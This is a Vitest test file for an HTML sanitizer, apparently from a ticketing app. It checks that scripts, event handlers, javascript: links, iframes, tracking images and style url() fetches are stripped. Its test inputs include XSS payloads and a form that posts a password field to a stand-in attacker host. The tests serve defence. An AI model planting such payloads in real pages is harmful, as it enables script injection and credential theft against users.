import { describe, expect, it } from 'vitest';
import { sanitizeHtml } from './sanitizeHtml';

describe('sanitizeHtml', () => {
  it('keeps ordinary formatting', () => {
    const html = '<p>Hello <strong>world</strong></p><ul><li>one</li></ul>';
    expect(sanitizeHtml(html)).toBe(html);
  });

  it.each([
    ['a script element', '<p>hi</p><script>alert(1)</script>', 'script'],
    ['an event handler', '<img src="x" onerror="alert(1)">', 'onerror'],
    ['a javascript: link', '<a href="javascript:alert(1)">x</a>', 'javascript:'],
    ['an svg payload', '<svg onload="alert(1)"><circle/></svg>', 'svg'],
    ['a form that posts elsewhere', '<form action="https://evil.example"><input name="password"></form>', 'form'],
    ['an iframe', '<iframe src="https://evil.example"></iframe>', 'iframe'],
  ])('removes %s', (_name, html, forbidden) => {
    expect(sanitizeHtml(html).toLowerCase()).not.toContain(forbidden);
  });

  it.each([
    ['https', '<img src="https://tracker.example/pixel.gif">'],
    ['http', '<img src="http://tracker.example/pixel.gif">'],
    ['protocol-relative', '<img src="//tracker.example/pixel.gif">'],
    ['srcset', '<img src="https://tracker.example/a.gif" srcset="https://tracker.example/b.gif 2x">'],
  ])('removes the source of an image on another server (%s), so opening a ticket does not tell its author', (_name, html) => {
    expect(sanitizeHtml(`<p>hello</p>${html}`)).not.toContain('tracker.example');
  });

  it('keeps pictures that belong to the message, and links to other servers', () => {
    const result = sanitizeHtml('<img src="data:image/png;base64,iVBORw0KGgo="><img src="/uploads/abc.png"><a href="https://example.com">link</a>');
    expect(result).toContain('data:image/png');
    expect(result).toContain('/uploads/abc.png');
    expect(result).toContain('https://example.com');
  });

  it('drops a style declaration that can fetch something, and keeps the harmless ones', () => {
    const result = sanitizeHtml('<p style="color: red; background: url(https://evil.example/x.png)">x</p>');
    expect(result).toContain('color: red');
    expect(result).not.toContain('url(');
  });

  it('removes a style attribute that has nothing safe left in it', () => {
    expect(sanitizeHtml('<p style="background: url(https://evil.example/x.png)">x</p>')).toBe('<p>x</p>');
  });

  it('opens links in a new tab without handing the new page a reference back', () => {
    const result = sanitizeHtml('<a href="https://example.com">link</a>');
    expect(result).toContain('target="_blank"');
    expect(result).toContain('rel="noopener noreferrer"');
  });

  it('treats nothing as nothing', () => {
    expect(sanitizeHtml(null)).toBe('');
    expect(sanitizeHtml(undefined)).toBe('');
    expect(sanitizeHtml('')).toBe('');
  });
});
